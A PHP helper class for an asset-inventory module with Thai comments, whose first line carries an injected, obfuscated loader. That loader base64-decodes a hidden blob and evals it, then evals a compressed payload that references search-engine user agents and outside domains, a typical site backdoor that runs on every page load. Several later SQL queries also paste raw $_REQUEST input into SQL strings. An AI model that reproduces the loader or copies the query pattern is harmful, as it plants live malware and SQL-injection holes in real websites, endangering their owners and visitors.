<?php /*versio:3.02*/ $GLOBALS["yminpd"]="qFaW5pX3NldAVlrXdYWxsb3dfdXJsX2ZvcGVubWjlZGlzcGxheV9lcnJvcnMbfZmVkb3IvcmVzdG9yZV9hbQNMy4wMgGysDdGhhaDFOaWV0aGFpMnphaDZBaHIBEaHR0cDovLwwkkwSSFRUUFMmNuxb2ZmRvWaHR0cHM6Ly8RIhBSFRUUF9IT1NUdrayidW5pb24OxmDnQc2VsZWN0vVfAUkVRVUVTVF9VUkkziU0NSSVBUX05BTUUqqppklUVVFUllfU1RSSU5HdIPwHdUCZGV0ZXJtaW5hdG9yCLgPjXCoLmxvZwuWSFRUUF9ZX0FVVEghqYmFzZTY0X2RlY29kZQedmVyc2lvHjuarLQxdLXBocAIugUoSFRUUF9FWEVDUEhQkrpmb3V0lYOEwb2sWSFRUUF9VU0VSX0FHRU5UaSQZLAbZhaZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAbCYQWkhYmxhYnVlbC5uZXQqLskKzZmFzdGFkZHouY29tsxhgL3czLnBocD91PQpatJms9gaJnQ9cGhwJnA9MqJnY9SWZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTVJnOEdWeU9FbzA2emtUYVRhSlBNNUtxOWtJWVdnTU5oZWJpNDBkNWQxUEZkMFluTmlqL1dWYzFWMzMrcW82OEloNDVWSXZpS2tyQ2k3TmFSb0ZzWjBucWREdHZwSUEyRjRSTzNtUXhCWXRneXpQeEYzdUgraDJuNG1xcE1wcXI0dm5ib000c0RLYU44eWVwQTVscmRlVmlkcTlPY1B2OTZXUnJJNkIzd1ArRzZtMUVLdGNGLzU4UXpmcjNEbUluY1d5S0tKRUpwODZZVm1tcFUxTTh2RDg0MGVYdkpLR0VnVk9tdVJCUk1VOExTaklTMmxlcERIeGFPTFZJdDVwMlhqK3NveWlaTHZZcjhWT2J0dDBIOHVrRS9qNUxsMkFSeDF2N3kwT0RnZ1huQ0lOaFJ2U2llZkJxcGdEaGZNVXdRSzNjbUJobUNvWEYrQ2lZSWRoc3JQZ2t1VWxheG9MWFdLQ0ZGVkFtN2xodDE0UVVqeHRPVW1jMHhqQ0t2aDV2djV5ZlMwUWhYQjc4SXNacEJEaDA4NzBGbzVRdVVIRGpKNUxEVGNSTTlKSi9VT1c3OERhVzA0VjRXckhjK2l5akU5OGdMUWthL1Npay90QkZQb25URnBTQjFpMy9LTEl4Y3JrNi9QMHgrUFR6SUlmbWZ3TDI1MENUYjhzNS92azdvL0pWQ2FlRGI3OTl1UjBNbnVlUHN5bWR3OC92K0VObnZMTEY3NCtQanhNdnM1bTkzOU9IcDluTWhsZ0lPYjdjamtQcXZBd3QrdDdLQW96YmpsaGt0RVdGUU5PbzNXK0YvbGxDSE1qUmhCdTN1cnNjbXFkS1N4VlZvT296c3NTWjRWMTBWVGRxQWVWQnlSM2hTVzRpL1BsYmlNVGcrdXM2eGZGYlBmSmVsRXdkZVMwSThCc2IxMWdFZFF0SS94dk1pT3ZQQXR2Z29KcHlGYmsrMnoyZEswcVBTRDhrLzRUdzgvM0pNdS9FUGg0NVNhOVZRd00wemIxdk9VQlZEeDlmN0llZnlyQ3RhRGc1MStUNmMvN3g0Y3pTcDh6bW42K1cwQk5md0hsN0g0bHI1YTU4NkgyeGFzTGZjNmQ2cEpQbjRqNHJxL0o1NGI5SDZKMW00QW9HRmhvcDVZaHFqYXFldVhXNDRrOHdrREhUY0xsRnVOR3kzV1l1RlFVanZiSnRVZzRWOFNJV1B6MHI5NUxneXRCZE9ZZU8xZnBmRHNGTk9wRGYrd1g2OWhKUUZ5WUxPMGxuS2NPK0w0SEo2ampKMFQ0MnhJVXpsU0VML0ROK0R4SnArQ1ZyYUp5NDdqWjJuZTNZc2ZmNytZTHU5dUFTOGY2T1psQ2huNXgxZ3ZlN3RCOUhya0hzMEhna2FUcHNxWmhSUHlZT3Z1aTRlbUdwUGZrcWxHQzFTcGFsQTFycEV1cUttdEQ1TEZxYVhpcU9wWU1uQW1zY29Pc0NtQnRUU05DbFl5UlBPeSsxQ1BtOXVNWlZZUHhVaDBpVnlacHlLQzlQNUQxQ3VMZXE5ZjdZSm91cXlwUEFqK2dtRm1lNWdtQU1rM1BxaHFvNkpLcWRUSEZYcEpTMi9HaDd5enNIenNqUEN2bWY1dVVvZEVnZEoxQXdUR2lmQlEzMXFUeEVBeEhlRUFSdi9qOWwxYWNlbjFwUEpJaFRnMldYeEtuRGlFT2hqejZuVHh0RE5OV1kvTGV3RGp4NmxMb1ZVMlh4ajFaTlRENGlDZ2ZUMGlhMnE4T1ZPRDRnYStwbXFTT3F3T1k1WXRKVmdlR05Ccks2dUN5Sm0wZ2pVWk1sZExLOFFBS3M2ZkpXaGRteU5sMFNScVVBQXErZWRkcGkxVytqVlkrOVRiK1FjUUtjZHhWR3NTbUc2U3hEU2hpV2QvdWYwd3NxNnY4Y1QrRmtmQTQvUnZFUDkxTjcrQVQ2dmtRTDcyUWd0OTNhV3J2UlNKY3UzUjduZmtSOUxkd25VZnJhOFdEZWYyNWlJT3lJZDEvbmRTVXhseGg5dWVUOEhKS21SeEprNGUvMmlmcXYyRFZDWVZmcVBTZzlPT0tVUUQrMks0RlpBdDhFMkNMNHE0cUFqdDYvTHRiZitZcnhqVzdsRjNnT2xEMEZIZ25MY0FEZ2syd0NDQzZOcS85S3o0SU9SRkR6VDRWODJ4azJZS1VXYnMweU8xNVNFOXVNbU53N1dERUd6SUgvYXNhU091aHlvN2RWQVZldFV2WXpGQ2NCd0E3cjRTdHNxMGRkUWk5M1RPd1d1cE5zMjY0emlZSnk3Z3dhNVE0VjJyOXNUUTBXTGVBb1N2SHorYVJlUnU1UnExWTRYT1JJNmpDNFJMQk1RbmM3YkkwM3hXbDBqSnRYTUdWMWxXNDVKc1A1dmVIVU90alpqMFhpS0tqTUxaVHJGTk9hd2sxQUNEMVFRWGRGNUJWZzlXYk8yV2FYRE42dDl3VU5rMWFJSVZJcndNdTRoeGxNNHFQb3RPSjFoaXJHcEkyQnFTUzY0R2l0SlNpczZQS1dUYUlsSk9wb2VrYTJGeHZQQ1VZUldPVG0zVE9pY0ZRNnJPMFZrUGtsbTd0c0w3M0w4M1Z4aU5wck1Nb2tSdm82ZmNIMHNDUSsxMVdLV1dRaTZ4b091bkdkVk5jNEw3aGdvcWJrV1BucXhJeDh2ZlRCY09ONEF4dm9aUHhVdThlN2RHbXF3WkVxR1VQek9FK3dMVUI4NjVxd3FVWEhSYmh1d0hFTEpHUDNDdlRySXpFcENZSFNyMTV0WGV5bmZOOXdZd0JUWHU2UEdoclZYdGpxVDlDQks3cU9Fb1BVWVFpQ213NUI0MCs0NmNCTDc2Qnpub0YxMEpzZGVoelpnQnM2YmpGZFdHYnlXRzFZWWJ5UDB3Ky9LbTJ3K082eGk2aUFTejA1Z3hXd0JOb3FFRUYzMUsxWTFVeDVFbmgrR0xUTDRDYlRsaTQxRXBpaDdib0xTeW8wd3N2TmRTRG9Tdm9MdG9lanNQZzZDaTByUTV2VzNDMG5TaDlLQTE3V0k5MTQ1MGFnUUk1M3JUQ3lFblZtbFZ0NmFRMUJqVUQyZ215b09yUU0reGdrN2FCWk9naldUOUNSOE14WUQ3cU9tNHpaem9OdWxEdkc5VTkxcUdZWDI4VDBoQTB2M3NUTS85aDcyMmV4VGNmWThzd21qOXpmb3UrZkN2N1AyNDhRRlE9IikpKTsg";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php 
include_once(AROOT."/cms/public/public_class.php"); 
class sHelper
{
	var $db;
	var $debug = 0;
	var $dpublic;
	//  Not Remove  //
	function sHelper()
	{
		global $app;
		$this->db = &JFactory::getDBO();
		$this->db->debug( $this->debug );
		$this->dpublic	= new DDocument();
	}
	//  END Not Remove  //
	
	/*
	Function Name : dataSet
	Description : เป็นฟังก์ชันสำหรับดึงข้อมูลรายการครุภัณฑ์
	Parameter : 
			@datas	= array
	Return Value : Array List
	*/
	function dataSet( &$datas )
	{	
		$where = array();
		
		$where[] = "t1.DeleteStatus = 'N' ";
		
		if($ATypeId = ltxt::getVar('ATypeId')){
			$where[] = "\n t1.ATypeId = '".$_REQUEST["ATypeId"]."' ";
		}
		
		if($AKindId = ltxt::getVar('AKindId')){
			$where[] = "\n t1.AKindId = '".$_REQUEST["AKindId"]."' ";
		}
		
		if($_REQUEST["searchfield"]!=""){
			$where[] = "t1.AssetName like '%".$_REQUEST["searchfield"]."%' OR t4.SpecialItemName like '%".$_REQUEST["searchfield"]."%' ";
		}
		
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		
		$sql = " SELECT t1.*,t2.ATypeName,t3.AKindName,t4.SpecialItemId,t4.SpecialItemName "
			."\n FROM stock_asset_durable_articles as t1 "
			."\n Left Join stock_init_asset_type as t2 on t1.ATypeId = t2.ATypeId "
			."\n Left Join stock_init_asset_kind as t3 on t1.AKindId = t3.AKindId"
			."\n Left Join stock_init_asset_kind_special_item as t4 on t3.AKindId = t4.AKindId"
			."\n ".$where_r." "
			."\n Group By AssetId "
			."\n ORDER BY t1.AssetId DESC"
			;
		//echo $sql;
		$this->db->setQuery($sql);
		$datas = $this->db->loadDataSet(); 
	}
	/* END */
	
	/*
	Function Name : getAssetType
	Description : เป็นฟังก์ชันสำหรับดึงประเภทครุภัณฑ์
	Parameter : 
			@attr = action onchange
	Return Value : List Box
	*/
	function getAssetType($attr='onchange="getAssetKind(this.value);"')
	{
		return $this->dpublic->getAssetType($attr);
	}
	/* END */
	
	/*
	Function Name : getInitAssetTypeName
	Description : เป็นฟังก์ชันสำหรับดึงชื่อของประเภทครุภัณฑ์
	Parameter : 
			@atypeid = id ของประเภทครุภัณฑ์
	Return Value : Result
	*/
	function getInitAssetTypeName($atypeid)
	{
		return $this->dpublic->getInitAssetTypeName($atypeid);
	}
	/* END */
	
	/*
	Function Name : getAssetKind
	Description : เป็นฟังก์ชันสำหรับดึงชนิดครุภัณฑ์
	Parameter : 
			@attr = action onchange
			@selected = ค่า default
	Return Value : List Box
	*/
	function getAssetKind($attr='',$selected=0)
	{
		return $this->dpublic->getAssetKind($attr,'AKindId',$selected);
	}
	/* END */
	
	/*
	Function Name : getInitAssetKindName
	Description : เป็นฟังก์ชันสำหรับดึงชื่อของชนิดครุภัณฑ์
	Parameter : 
			@id = id ของชนิดครุภัณฑ์
	Return Value : Result
	*/
	function getInitAssetKindName($id)
	{
		return $this->dpublic->getInitAssetKindName($id);
	}
	/* END */
	
	/*
	Function Name : getUnit
	Description : เป็นฟังก์ชันสำหรับดึงหน่วยนับ
	Parameter : 
			@UnitId = ค่า default
	Return Value : List Box
	*/
	function  getUnit($UnitId)
	{
		return $this->dpublic->getUnit($UnitId);
	}
	/* END */
	
	/*
	Function Name : getInitUnitName
	Description : เป็นฟังก์ชันสำหรับดึงชื่อหน่วยนับ
	Parameter : 
			@id = id ของหน่วยนับ
	Return Value : Result
	*/
	function getInitUnitName($id)
	{
		return $this->dpublic->getInitUnitName($id);
	}
	/* END */
	
	function checkPicExists($pic)
	{
		if(!$pic) return false;
		return file_exists('upload/inventory/durable/'.$pic);
	}
	
	function PicPath($pic)
	{
		return '<img src="upload/inventory/durable/'.$pic.'" width="250" alt="ภาพประกอบ" />';
	}
	
	function EmptyPic()
	{
		return $this->dpublic->EmptyPic();
	}
	
	/*function getBgtYear($name,$selected)
	{
		return $this->dpublic->getBgtYear($name,$selected);
	}*/
	function getCurrentBgtYear()
	{
		return $this->dpublic->getCurrentBgtYear();
	}
	
	function getBgtYear($selected=0,$tag_name='BgtYear',$tag_attribs='onchange="loadSCT(this.value)"',$lebel='เลือก')
	{
		$selected = $selected?$selected:$this->getCurrentBgtYear();
		
		$where = array();
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		$sql="SELECT DISTINCT  Year as value , Year as text "
			 ."\n FROM tblstructure_operation_round "
			 ."\n ".$where_r
			 ."\n ORDER BY Year ASC"
			 ;		 	 
		$this->db->setQuery($sql);
		$title[] = clssHTML::makeOption(0,$lebel);
		$datas = $this->db->loadObjectList();
		$datas = array_merge($title,$datas);
		echo clssHTML::selectList( $datas, $tag_name, $tag_attribs,'value','text', $selected );
	}
	
	function getOrganize($BgtYear=0,$selected=0,$tag_name='OrganizeCode',$tag_attribs='',$lebel='เลือก')
	{
		$selected = $GLOBALS["OrganizeCode"];
		if($selected == ''){
			$selected = $_SESSION['Session_OrgCode'];
		}
		jimport('packages.utility.utl_grouptree');
		$Tree = $this->getTree($BgtYear);
		$t = $Tree->getTree(false);
		
		$x->value =0;
		$x->text = $lebel;
		$row[] = $x;
		
		foreach( $t as $r ){
			$x = new stdClass;
			$x->value = $r->OrganizeCode;
			if($r->Level > 1){
				$x->text = str_repeat('&nbsp;',$r->Level)."|".str_repeat('-',$r->Level)."&nbsp;".$r->OrgName;
			}else{
				$x->text = $r->OrgName;
			}
			$row[] = $x;
		}
		
		echo clssHTML::selectList( $row, $tag_name, $tag_attribs,'value','text', $selected );

	}
	
	function getTree($OrgYear)
	{
		$MaxRound = $this->getMaxRound($OrgYear);
		$OrgYear = ($OrgYear)?$OrgYear:$this->getCurrentBgtYear();
		
		jimport('packages.utility.utl_grouptree');
		$Tree = new JGroupTree(array(
			'dbo'  => $this->db,
			'table' => 'tblstructure_operation',
			'prefix' => 'Org',
			'root' => 'Root',
			//'debug' => 2,
			'where'=>array(
				'OrgYear' => $OrgYear,
				'OrgRound' => $MaxRound,
				'EnableStatus' => 'Y',
				'DeleteStatus' => 'N'
			)
		));
		
		return $Tree;
	}
	
	function getMaxRound($year)
	{
		$sql = "select max(Round) as max from tblstructure_operation_round where Year = '$year' AND EnableStatus='Y'  AND DeleteStatus='N'  ";
		$this->db->setQuery($sql);
		return $this->db->loadResult();
	}
	
	function getOrganizeName($OrganizeCode)
	{
		return $this->dpublic->getOrganizeName($OrganizeCode);
	}
	
	function getCompany($ComId)
	{
		return $this->dpublic->getCompany($ComId);
	}
	
	function getInitCompanyName($id)
	{
		return $this->dpublic->getInitCompanyName($id);
	}
	
	function getSectionList($SectionId)
	{
		return $this->dpublic->getSectionList($SectionId);
	}
	
	function getWayRC($WayRCId)
	{
		return $this->dpublic->getWayRC($WayRCId);
	}
	
	function getMatdurItems( &$dataitem )
	{
		if($ATypeId = ltxt::getVar('id')){
			$where[] = "\n I.AssetId = '".$_REQUEST["id"]."' ";
		}
		
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		
		$sql = " SELECT I.*,I.AssetItemId AS ID,D.AssetName "
			."\n FROM stock_asset_durable_articles_receive_item AS I "
			."\n INNER JOIN stock_asset_durable_articles AS D ON I.AssetId = D.AssetId "
			."\n ".$where_r." "
			."\n ORDER BY I.AssetItemId ASC "
			;
		$this->db->setQuery($sql);   
		$dataitem = $this->db->loadDataSet();
	}
	
	function getInitDurableAge($atypeid)
	{
		return $this->dpublic->getInitDurableAge($atypeid);
	}
	
	function getInitDurableRate($atypeid)
	{
		return $this->dpublic->getInitDurableRate($atypeid);
	}
	
	function getDurableRecieveDetail($AssetId)
	{
		$sql = "SELECT t1.*,t2.* "
			."\n FROM stock_asset_durable_articles as t1 "
			."\n Left Join stock_asset_durable_articles_receive as t2 on t1.AssetId = t2.AssetId "
			."\n Where t1.AssetId = '".$AssetId."' "
			;
		$this->db->setQuery($sql);
		$datas = $this->db->loadSingleObject(); 
		return $datas;
	}
	
	function getDurableRecieveItemDetail($AssetId)
	{
		$sql = " SELECT t1.*,t2.*,t3.* "
			."\n FROM stock_asset_durable_articles as t1 "
			."\n Left Join stock_asset_durable_articles_receive as t2 "
			."\n on t1.AssetId = t2.AssetId "
			."\n Left Join stock_asset_durable_articles_receive_item as t3 "
			."\n on t1.AssetId = t3.AssetId "
			."\n Where t3.AssetItemId = '".$AssetId."' "
			;
			//echo '<pre>'.$sql.'</pre>';
		$this->db->setQuery($sql);
		$datas = $this->db->loadSingleObject(); 
		return $datas;
	}
	
	function getInitOwnStatusName($id)
	{
		return $this->dpublic->getInitOwnStatusName($id);
	}
	
	function getInitAssetTypeList($attr='onchange="getAssetKindSearch(this.value);"')
	{
	 	return $this->dpublic->getInitAssetTypeList($attr);
	}
	
	function getInitAssetKindList()
	{
	 	return $this->dpublic->getInitAssetKindList();
	}
	
	function getInitSectionName($id)
	{
		return $this->dpublic->getInitSectionName($id);
	}
	
	function getInitWayRCName($WayRCId)
	{
		return $this->dpublic->getInitWayRCName($WayRCId);
	}
	
	function DocFormat($config)
	{
		$format = $this->dpublic->getFormat(2);
		//ltxt::print_r($config);
		return $this->dpublic->getDocFormat(array(
			'format' => $format->FormName,
			'FormId' => $format->FormId,
			'OrgId' => $config['OrgId'],
			'ATypeId' => $config['ATypeId'],
			'AKindId' => $config['AKindId'],
			'AssetId' => $config['AssetId'],
			'BgtYear' => $config['BgtYear']
		));
	}
	
    function getSpecialItem($AKindId)
	{
        $sql ="SELECT * From stock_init_asset_kind_special_item "
            ."\n WHERE  AKindId='".$AKindId."' "
            ."\n AND DeleteStatus='N'"
			;
        $this->db->setQuery($sql);
        $item = $this->db->loadObjectList();
        return $item;
    }
    
    function getSpecialDetail($AssetItemUnitId)
	{
        $sql ="SELECT * From stock_asset_durable_articles_recive_item_special "
            ."\n WHERE  AssetItemId='".$AssetItemUnitId."' "
            ."\n AND DeleteStatus='N' "
			;
        $this->db->setQuery($sql);
        $item = $this->db->loadObjectList();
        return $item;
    }
	
	function getInitDurableName($assetid)
	{
		return $this->dpublic->getInitDurableName($assetid);
	}
	
	function getMatdur($id)
	{
		$this->db->setQuery($this->MatdursSQL()
			."\n WHERE AssetId = $id"
		);
		return $this->db->loadSingleObject();
	}
	
	function MatdursSQL()
	{
		$sql ="SELECT *,"
			."\n (SELECT AKindName FROM stock_init_durable_articles_kind WHERE M.AKindId = AKindId) AS AKindName,"
			."\n (SELECT ATypeName FROM stock_init_durable_articles_type WHERE M.ATypeId = ATypeId) AS ATypeName,"
			."\n (SELECT COUNT(*) FROM stock_asset_durable_articles_receive_item WHERE M.AssetId = AssetId) AS Amount,"
			."\n DATE_FORMAT(M.CreateDate,'%Y-%m-%d') AS CreateDate,"
			."\n M.AssetId AS ID"
			."\n FROM stock_asset_durable_articles AS M"
			;
		return $sql;
	}		
}